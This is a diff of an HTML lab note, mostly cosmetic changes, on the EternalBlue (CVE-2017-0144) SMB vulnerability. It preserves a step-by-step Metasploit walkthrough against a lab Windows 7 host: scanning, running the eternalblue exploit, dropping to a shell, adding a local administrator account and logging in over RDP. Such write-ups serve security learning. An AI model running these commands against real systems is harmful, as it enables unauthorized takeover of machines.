@@ -1,23 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2023-12-03 Sun 16:49 -->
+<!-- 2024-01-07 Sun 22:10 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>CVE-2017-0144</title>
 <meta name="author" content="Honbey Zhang" />
 <meta name="generator" content="Org Mode" />
-
-                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/htmlize.css" type="text/css"/>
-                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/bigblow.css" type="text/css"/>
-                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/hideshow.css" type="text/css"/>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-1.11.0.min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-ui-1.10.2.min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.localscroll-min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.scrollTo-1.4.3.1-min.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/bigblow.js"></script>
-                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/hideshow.js"></script>
-                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
 </head>
 <body>
 <div id="content" class="content">
@@ -27,19 +16,19 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org7971cc0">Introduction - Eternal Blue</a>
+<li><a href="#org361bee8">Introduction - Eternal Blue</a>
 <ul>
-<li><a href="#org2e639cf">步骤</a></li>
-<li><a href="#org4b6108d">Tips</a></li>
-<li><a href="#org30915ac">参考链接</a></li>
+<li><a href="#orgb32a305">步骤</a></li>
+<li><a href="#org2fe61b9">Tips</a></li>
+<li><a href="#org8d07c81">参考链接</a></li>
 </ul>
 </li>
 </ul>
 </div>
 </nav>
-<div id="outline-container-org7971cc0" class="outline-2">
-<h2 id="org7971cc0">Introduction - Eternal Blue</h2>
-<div class="outline-text-2" id="text-org7971cc0">
+<div id="outline-container-org361bee8" class="outline-2">
+<h2 id="org361bee8">Introduction - Eternal Blue</h2>
+<div class="outline-text-2" id="text-org361bee8">
 <p>
 利用 Metasploit 中针对 ms17-101 漏洞的攻击载荷进行攻击获取主机控制权限。“永恒之蓝”的原理主要是扫描所有开放 445 文件共享端口的 Windows 机器。445 端口可以在局域网中轻松访问各种共享文件夹或共享打印机。
 </p>
@@ -49,16 +38,16 @@
 <li>Target Machine: Windows 7 Ultimate x64</li>
 </ul>
 </div>
-<div id="outline-container-org2e639cf" class="outline-3">
-<h3 id="org2e639cf">步骤</h3>
-<div class="outline-text-3" id="text-org2e639cf">
+<div id="outline-container-orgb32a305" class="outline-3">
+<h3 id="orgb32a305">步骤</h3>
+<div class="outline-text-3" id="text-orgb32a305">
 <ol class="org-ol">
 <li><p>
 Bash
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">nmap -r 10.20.20.0/28 <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">search target (optional)</span>
-msfconsole
+<pre class="src src-bash"><span style="color: #006DAF;">nmap</span> <span style="color: #D0372D;">-r</span> 10.20.20.0/<span style="color: #D0372D;">28</span> <span style="color: #8D8D84; font-style: italic;"># search target (optional)</span>
+<span style="color: #006DAF;">msfconsole</span>
 </pre>
 </div></li>
 
@@ -66,12 +55,12 @@ msfconsole
 msfconsole
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">search ms17_010
-use auxiliary/scanner/smb/smb_ms17_010
+<pre class="src src-bash"><span style="color: #006DAF;">search</span> ms17_010
+<span style="color: #006DAF;">use</span> auxiliary/scanner/smb/smb_ms17_010
 <span style="color: #006FE0;">set</span> rhosts 10.20.20.7
-use exploit/windows/smb/ms17_010_eternalblue
+<span style="color: #006DAF;">use</span> exploit/windows/smb/ms17_010_eternalblue
 <span style="color: #006FE0;">set</span> rhosts 10.20.20.7
-run <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">exploit</span>
+<span style="color: #006DAF;">run</span> <span style="color: #8D8D84; font-style: italic;"># exploit</span>
 </pre>
 </div></li>
 
@@ -79,8 +68,8 @@ run <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-sty
 meterpreter
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #8D8D84;">#</span><span style="color: #8D8D84; font-style: italic;">if it not enter CMD automatically, input the below command in meterpreter</span>
-shell
+<pre class="src src-bash"><span style="color: #8D8D84; font-style: italic;">#if it not enter CMD automatically, input the below command in meterpreter</span>
+<span style="color: #006DAF;">shell</span>
 </pre>
 </div></li>
 
@@ -98,17 +87,17 @@ net localgroup administrators USERNAME /add
 Bash
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">rdesktop 10.20.20.7:3389
-<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">then input the USERNAME and PASSWORD you had created</span>
-<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">now you can control the target machine</span>
+<pre class="src src-bash"><span style="color: #006DAF;">rdesktop</span> 10.20.20.7:3389
+<span style="color: #8D8D84; font-style: italic;"># then input the USERNAME and PASSWORD you had created</span>
+<span style="color: #8D8D84; font-style: italic;"># now you can control the target machine</span>
 </pre>
 </div></li>
 </ol>
 </div>
 </div>
-<div id="outline-container-org4b6108d" class="outline-3">
-<h3 id="org4b6108d">Tips</h3>
-<div class="outline-text-3" id="text-org4b6108d">
+<div id="outline-container-org2fe61b9" class="outline-3">
+<h3 id="org2fe61b9">Tips</h3>
+<div class="outline-text-3" id="text-org2fe61b9">
 <p>
 The Below OS version may cause Blue Screen and cannot use successfully:
 </p>
@@ -123,9 +112,9 @@ It&rsquo;s likly the 32-bit OS of Windows 7 as the same case, but we can attack 
 </p>
 </div>
 </div>
-<div id="outline-container-org30915ac" class="outline-3">
-<h3 id="org30915ac">参考链接</h3>
-<div class="outline-text-3" id="text-org30915ac">
+<div id="outline-container-org8d07c81" class="outline-3">
+<h3 id="org8d07c81">参考链接</h3>
+<div class="outline-text-3" id="text-org8d07c81">
 <ol class="org-ol">
 <li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144">cve.mitre.org</a></li>
 </ol>
@@ -134,13 +123,7 @@ It&rsquo;s likly the 32-bit OS of Windows 7 as the same case, but we can attack 
 </div>
 </div>
 <div id="postamble" class="status">
-
-                     Theme
-                     <a href="https://github.com/fniessen/org-html-themes" target="_blank">bigblow</a>
-                     by
-                     <a href="https://github.com/fniessen" target="_blank">fniessen</a>
-                     <br>
-                     <a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
+<a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
 </div>
 </body>
 </html>
